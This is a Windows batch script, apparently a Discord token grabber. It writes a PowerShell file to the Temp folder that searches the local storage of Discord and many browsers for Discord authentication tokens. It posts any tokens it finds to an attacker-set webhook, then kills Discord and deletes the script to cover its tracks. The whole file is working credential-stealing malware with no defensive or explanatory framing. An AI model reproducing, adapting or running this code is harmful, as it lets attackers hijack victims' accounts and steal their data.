@echo off
set webhook=webhook here
echo $hook  = "%webhook%" >%userprofile%\AppData\Local\Temp\bnt.ps1
echo $token = new-object System.Collections.Specialized.StringCollection >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo.  >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo.  >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo $db_path = @( >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Discord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Roaming\Discord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Roaming\Lightcord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Roaming\discordptb\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Roaming\discordcanary\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera Stable\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo. >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\Amigo\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\Torch\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\Kometa\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\Orbitum\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\CentBrowser\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\7Star\7Star\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\Vivaldi\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\Google\Chrome SxS\User Data\Local Storage\leveldb"	 >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\Epic Privacy Browser\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\Google\Chrome\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $env:APPDATA + "\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo ) >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo. >>%userprofile%\AppData\Local\Temp\bnt.ps1 
echo foreach ($path in $db_path) { >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     if (Test-Path $path) { >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo         foreach ($file in Get-ChildItem -Path $path -Name) { >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo             $data = Get-Content -Path "$($path)\$($file)" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo             $regex = [regex] "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}" >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo             $match = $regex.Match($data) >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo. >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo            while ($match.Success) { >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo                 if (!$token.Contains($match.Value)) { >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo                     $token.Add($match.Value) ^| out-null >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo                 } >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo. >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo                $match = $match.NextMatch() >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo             } >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo         } >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     } >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo } >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo. >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo $content = ">>> ||@everyone|| **New Token** ``` " >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo foreach ($data in $token) { >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo     $content = [string]::Concat($content, "`n", $data) >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo } >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo $content = [string]::Concat($content, "``` ") >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo. >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo $JSON = @{ "content"= $content;}^| convertto-json >>%userprofile%\AppData\Local\Temp\bnt.ps1
echo Invoke-WebRequest -uri $hook -Method POST -Body $JSON -Headers @{"Content-Type" = "application/json"} >>%userprofile%\AppData\Local\Temp\bnt.ps1
Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\bnt.ps1
taskkill /im discord.exe /f 
:e
del %userprofile%\AppData\Local\Temp\bnt.ps1 
